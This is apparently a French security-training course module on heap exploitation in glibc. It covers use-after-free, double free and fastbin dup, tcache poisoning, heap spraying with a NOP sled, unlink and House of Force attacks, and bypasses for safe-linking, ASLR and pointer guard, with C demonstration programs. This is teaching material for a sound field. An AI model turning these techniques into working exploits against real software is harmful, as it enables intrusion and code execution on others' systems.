# Module 31 : Exploitation du Heap Avancée

## Objectifs

À la fin de ce module, tu seras capable de :
- Comprendre les vulnérabilités heap : Use-After-Free, Double Free
- Maîtriser les techniques de Heap Spray
- Exploiter les corruptions de métadonnées heap
- Contourner les protections modernes du heap

---

## 1. Rappel : Structure du Heap

### 1.1 Chunks malloc (glibc)

```
STRUCTURE D'UN CHUNK ALLOUÉ :
┌────────────────────────────────────────┐
│         prev_size (si libre)           │  8 bytes
├────────────────────────────────────────┤
│    size    │ A │ M │ P │               │  8 bytes (flags en bits bas)
├────────────────────────────────────────┤
│                                        │
│           USER DATA                    │  ← Pointeur retourné par malloc
│                                        │
└────────────────────────────────────────┘

FLAGS :
- P (PREV_INUSE) : Le chunk précédent est utilisé
- M (IS_MMAPPED) : Alloué via mmap
- A (NON_MAIN_ARENA) : Pas dans l'arène principale

CHUNK LIBÉRÉ (dans fastbin) :
┌────────────────────────────────────────┐
│              prev_size                 │
├────────────────────────────────────────┤
│                size                    │
├────────────────────────────────────────┤
│                 fd                     │  ← Forward pointer (prochain libre)
├────────────────────────────────────────┤
│                 bk                     │  ← Backward pointer (si pas fastbin)
└────────────────────────────────────────┘
```

### 1.2 Bins et Free Lists

```
ORGANISATION DES CHUNKS LIBRES :

FASTBINS (tailles fixes, LIFO, pas de coalescing) :
┌────────┐    ┌────────┐    ┌────────┐
│ 32 B   │───→│ chunk  │───→│ chunk  │───→ NULL
├────────┤    └────────┘    └────────┘
│ 48 B   │───→ ...
├────────┤
│ 64 B   │───→ ...
└────────┘

UNSORTED BIN (chunks récemment libérés) :
HEAD ←→ chunk ←→ chunk ←→ chunk ←→ HEAD

SMALL BINS (< 512 bytes, tailles exactes) :
LARGE BINS (>= 512 bytes, plages de tailles)
```

---

## 2. Use-After-Free (UAF)

### 2.1 Le Concept

```
USE-AFTER-FREE : Utiliser un pointeur après que la mémoire a été libérée

SCÉNARIO :
1. ptr = malloc(64)      → Allocation
2. free(ptr)             → Libération (ptr devient "dangling")
3. *ptr = 0x41414141     → UTILISATION APRÈS FREE !

POURQUOI C'EST DANGEREUX ?

Après free(), le chunk va dans une freelist.
Une nouvelle allocation peut réutiliser CE MÊME chunk.
Le code qui utilise le vieux pointeur manipule maintenant
des données contrôlées par l'attaquant !
```

### 2.2 Visualisation

```
ÉTAT 1 : Après malloc
┌────────────────────────────────────┐
│  victim_ptr ──→ [ object A ]       │  chunk utilisé
└────────────────────────────────────┘

ÉTAT 2 : Après free(victim_ptr)
┌────────────────────────────────────┐
│  victim_ptr ──→ [ freed chunk ]    │  dans freelist
│                     │              │
│                     ↓              │
│                fastbin head        │
└────────────────────────────────────┘

ÉTAT 3 : Après evil_ptr = malloc(64)
┌────────────────────────────────────┐
│  victim_ptr ──→ [ evil data ]      │  MÊME adresse !
│  evil_ptr   ──→                    │
└────────────────────────────────────┘

ÉTAT 4 : victim_ptr->function()
┌────────────────────────────────────┐
│  Appel de fonction sur données     │
│  contrôlées par l'attaquant !      │
│  → EXÉCUTION DE CODE               │
└────────────────────────────────────┘
```

### 2.3 Exemple Vulnérable

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    char name[32];
    void (*print_func)(const char *);
} User;

void safe_print(const char *msg) {
    printf("Message: %s\n", msg);
}

int main() {
    User *user = malloc(sizeof(User));
    strcpy(user->name, "Alice");
    user->print_func = safe_print;

    // Utilisation normale
    user->print_func(user->name);  // OK

    // Libération
    free(user);

    // ERREUR : le pointeur n'est pas mis à NULL
    // user = NULL;  // Aurait évité le problème

    // Nouvelle allocation (même taille !)
    char *evil = malloc(sizeof(User));
    memset(evil, 'A', sizeof(User));

    // Écrire une adresse malveillante où était print_func
    // Offset de print_func = 32 bytes (après name[32])
    unsigned long *func_ptr = (unsigned long *)(evil + 32);
    *func_ptr = 0x41414141;  // Adresse du shellcode

    // USE-AFTER-FREE !
    user->print_func(user->name);  // Appelle 0x41414141 !

    return 0;
}
```

### 2.4 Exploitation Réaliste

```c
// Contexte : Programme avec objets alloués dynamiquement

typedef struct {
    int id;
    char data[56];
    void (*callback)(void *);  // Pointeur de fonction !
} VulnObject;

// Stratégie d'exploitation :
// 1. Créer un objet
// 2. Le libérer (sans nullifier le pointeur)
// 3. Spray le heap avec des données contrôlées
// 4. Déclencher l'utilisation du pointeur dangling

void exploit_uaf(void) {
    // Étape 1 : Allocation initiale
    VulnObject *obj = malloc(sizeof(VulnObject));
    obj->callback = legitimate_function;

    // Étape 2 : Free (bug - pointeur pas nullifié)
    free(obj);

    // Étape 3 : Heap spray avec shellcode pointer
    for (int i = 0; i < 100; i++) {
        char *spray = malloc(sizeof(VulnObject));
        // Remplir avec l'adresse du shellcode
        memset(spray, 0, sizeof(VulnObject));
        *(void **)(spray + offsetof(VulnObject, callback)) = shellcode_addr;
    }

    // Étape 4 : Trigger UAF
    obj->callback(obj);  // Exécute shellcode !
}
```

---

## 3. Double Free

### 3.1 Le Concept

```
DOUBLE FREE : Libérer deux fois le même chunk

free(ptr);
free(ptr);  // DOUBLE FREE !

POURQUOI C'EST EXPLOITABLE ?

Le même chunk apparaît DEUX FOIS dans la freelist.
Deux allocations successives retournent la MÊME adresse !

FREELIST CORROMPUE :
fastbin → [chunk A] → [chunk B] → [chunk A] → ...
                                      ↑
                                 Boucle infinie !
```

### 3.2 Technique : Fastbin Dup

```
FASTBIN DUPLICATION (contourner la protection basique)

Protection : glibc vérifie si le chunk au sommet == chunk à libérer
Contournement : Intercaler une autre libération

SÉQUENCE :
1. a = malloc(64)
2. b = malloc(64)
3. free(a)           → fastbin: [a]
4. free(b)           → fastbin: [b] → [a]
5. free(a)           → fastbin: [a] → [b] → [a]  ← DOUBLE FREE !

MAINTENANT :
6. c = malloc(64)    → retourne a, fastbin: [b] → [a]
7. d = malloc(64)    → retourne b, fastbin: [a]
8. e = malloc(64)    → retourne a ENCORE !

c et e pointent vers la MÊME mémoire !
```

### 3.3 Code d'Exploitation

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    // Allocations
    void *a = malloc(0x30);
    void *b = malloc(0x30);

    printf("a = %p\n", a);
    printf("b = %p\n", b);

    // Double free avec intercalage
    free(a);
    free(b);
    free(a);  // Double free !

    // Maintenant fastbin contient: a → b → a

    // Première réallocation : obtient 'a'
    void *c = malloc(0x30);
    printf("c = %p (devrait être == a)\n", c);

    // On peut maintenant écrire dans 'c' pour modifier
    // le pointeur 'fd' du chunk 'a' dans la freelist
    // Cela permet d'allouer un chunk à une adresse arbitraire !

    // Écrire une fausse adresse fd
    *(void **)c = (void *)0x7fffffffe000;  // Adresse cible

    void *d = malloc(0x30);  // Obtient 'b'
    void *e = malloc(0x30);  // Obtient 'a' (maintenant avec fd modifié)
    void *f = malloc(0x30);  // Obtient l'ADRESSE ARBITRAIRE !

    printf("f = %p (adresse arbitraire !)\n", f);

    return 0;
}
```

### 3.4 Tcache Poisoning (glibc 2.26+)

```
TCACHE : Thread-local cache, plus rapide mais moins sécurisé

Structure tcache_entry :
┌────────────────┐
│     next       │  → Prochain chunk libre (non masqué avant 2.32)
├────────────────┤
│     key        │  → Protection double-free (depuis 2.29)
└────────────────┘

ATTAQUE (glibc < 2.32) :
1. Double free dans tcache
2. Modifier 'next' pointer
3. malloc() retourne adresse arbitraire

CONTOURNEMENT KEY (glibc >= 2.29) :
- Le 'key' doit être différent de tcache_perthread_struct
- Écraser key avec une valeur différente avant double free
```

---

## 4. Heap Spray

### 4.1 Le Concept

```
HEAP SPRAY : Remplir le heap avec des données répétitives

POURQUOI ?
- Augmenter les chances de "deviner" une adresse
- Créer un "terrain d'atterrissage" pour shellcode
- Exploiter des bugs sans leak d'adresse précise

STRATÉGIE :
┌─────────────────────────────────────────────────────────┐
│ Adresse       Contenu                                   │
├─────────────────────────────────────────────────────────┤
│ 0x10000000    [NOP sled + shellcode]                   │
│ 0x10001000    [NOP sled + shellcode]                   │
│ 0x10002000    [NOP sled + shellcode]                   │
│ ...           ...                                       │
│ 0x20000000    [NOP sled + shellcode]                   │
└─────────────────────────────────────────────────────────┘

Si on saute n'importe où entre 0x10000000 et 0x20000000,
on atterrit dans un NOP sled qui mène au shellcode !
```

### 4.2 Implémentation

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define SPRAY_COUNT 1000
#define SPRAY_SIZE  0x10000  // 64 KB par bloc

unsigned char shellcode[] = "\x31\xc0\x50\x68...";  // Shellcode

void heap_spray(void) {
    void *sprayed[SPRAY_COUNT];

    // Créer le payload : NOP sled + shellcode
    unsigned char *payload = malloc(SPRAY_SIZE);

    // Remplir de NOPs (0x90 sur x86)
    memset(payload, 0x90, SPRAY_SIZE);

    // Placer le shellcode à la fin
    size_t sc_offset = SPRAY_SIZE - sizeof(shellcode);
    memcpy(payload + sc_offset, shellcode, sizeof(shellcode));

    // Spray !
    for (int i = 0; i < SPRAY_COUNT; i++) {
        sprayed[i] = malloc(SPRAY_SIZE);
        memcpy(sprayed[i], payload, SPRAY_SIZE);

        if (i % 100 == 0) {
            printf("Sprayed %d blocks, last at %p\n", i, sprayed[i]);
        }
    }

    // Maintenant, sauter à une adresse "devinée" comme 0x0c0c0c0c
    // devrait atterrir dans un NOP sled

    free(payload);
}

int main() {
    printf("Starting heap spray...\n");
    heap_spray();
    printf("Heap spray complete.\n");
    return 0;
}
```

### 4.3 Heap Spray pour UAF

```c
// Remplacer un objet libéré avec des données contrôlées

typedef struct {
    void *vtable;  // Virtual table pointer
    char data[120];
} VictimObject;

void spray_for_uaf(void *target_vtable) {
    // Créer un faux objet
    VictimObject *fake = malloc(sizeof(VictimObject));
    fake->vtable = target_vtable;  // Fausse vtable !
    memset(fake->data, 'A', sizeof(fake->data));

    // Spray le heap avec des copies
    for (int i = 0; i < 1000; i++) {
        VictimObject *spray = malloc(sizeof(VictimObject));
        memcpy(spray, fake, sizeof(VictimObject));
    }

    // Maintenant, si un pointeur dangling est utilisé,
    // il y a de fortes chances qu'il pointe vers notre faux objet
}
```

---

## 5. Corruption de Métadonnées

### 5.1 Unsafe Unlink

```
UNLINK : Retirer un chunk d'une liste doublement chaînée

MACRO (simplifiée) :
#define unlink(P, BK, FD) {    \
    FD = P->fd;                \
    BK = P->bk;                \
    FD->bk = BK;               \  ← Write-What-Where !
    BK->fd = FD;               \
}

SI ON CONTRÔLE fd ET bk :
P->fd = &target - offsetof(chunk, bk)
P->bk = value_to_write

Après unlink :
target = value_to_write   ← ÉCRITURE ARBITRAIRE !
```

### 5.2 Protection Moderne

```c
// Check ajouté dans glibc moderne
if (FD->bk != P || BK->fd != P)
    abort();

// Contournement : Nécessite un leak d'adresse heap
// pour créer des pointeurs valides
```

### 5.3 House of Force (Historique)

```
HOUSE OF FORCE : Exploiter le top chunk

TOP CHUNK : Chunk spécial à la fin du heap

ATTAQUE :
1. Overflow pour écraser la taille du top chunk avec -1 (0xFFFFFFFF...)
2. malloc(distance_to_target) → Le top chunk "saute" à l'adresse cible
3. malloc(small) → Allocation à l'adresse arbitraire !

CONDITION : Pouvoir écrire la taille du top chunk
```

---

## 6. Protections Modernes

### 6.1 Safe-Linking (glibc 2.32+)

```
SAFE-LINKING : Masquer les pointeurs dans tcache/fastbin

PROTECTION :
next_masked = next XOR (chunk_addr >> 12)

IMPACT :
- Impossible de simplement écrire une adresse arbitraire
- Nécessite un leak du heap pour calculer le mask

CONTOURNEMENT :
1. Leak une adresse heap
2. Calculer : mask = leaked_ptr XOR known_next
3. Forger : fake_next = target XOR mask
```

### 6.2 Heap ASLR

```
ASLR SUR LE HEAP :

L'adresse de base du heap est randomisée.
Rend les adresses imprévisibles.

CONTOURNEMENT :
- Information leak (format string, UAF read, etc.)
- Heap grooming pour prédire les layouts
- Relative overwrites (modifier juste les bits bas)
```

### 6.3 Pointer Guard

```
POINTER GUARD : Protection des pointeurs de fonction

Pointeurs stockés = pointeur XOR cookie_secret

CONTOURNEMENT :
- Leak du cookie (dans TLS)
- Attaquer avant le déréférencement
```

---

## 7. Techniques de Grooming

### 7.1 Heap Feng Shui

```
HEAP FENG SHUI : Contrôler le layout du heap

OBJECTIF : Placer des chunks à des positions prévisibles

TECHNIQUE :
1. Allouer des chunks "padding"
2. Libérer stratégiquement pour créer des "trous"
3. Les allocations ciblées remplissent ces trous

EXEMPLE :
┌───┬───┬───┬───┬───┬───┐
│ A │ B │ C │ D │ E │ F │  Allocations initiales
└───┴───┴───┴───┴───┴───┘

free(B); free(D);
┌───┬───┬───┬───┬───┬───┐
│ A │   │ C │   │ E │ F │  Trous créés
└───┴───┴───┴───┴───┴───┘

victim = malloc(); evil = malloc();
┌───┬───────┬───┬──────┬───┬───┐
│ A │victim │ C │ evil │ E │ F │  Placement contrôlé
└───┴───────┴───┴──────┴───┴───┘

Maintenant evil peut overflow dans victim !
```

### 7.2 Code de Grooming

```c
void heap_groom(void) {
    void *chunks[100];

    // Phase 1 : Remplir le heap
    for (int i = 0; i < 100; i++) {
        chunks[i] = malloc(0x80);
    }

    // Phase 2 : Créer des trous alternés
    for (int i = 0; i < 100; i += 2) {
        free(chunks[i]);
        chunks[i] = NULL;
    }

    // Phase 3 : Allocations ciblées
    // Les nouveaux chunks remplissent les trous
    void *target = malloc(0x80);  // Prévisible !
    void *attacker = malloc(0x80); // Adjacent à target
}
```

---

## 8. Checklist

- [ ] Comprendre la structure des chunks malloc
- [ ] Identifier les vulnérabilités UAF dans le code
- [ ] Exploiter les double free avec fastbin dup
- [ ] Implémenter un heap spray basique
- [ ] Comprendre les protections modernes (safe-linking, tcache key)
- [ ] Pratiquer le heap grooming

---

## Exercices

Voir [exercice.md](exercice.md)

---

**Prochaine étape :** Phase OS-spécifique (Windows, Linux, ou macOS)
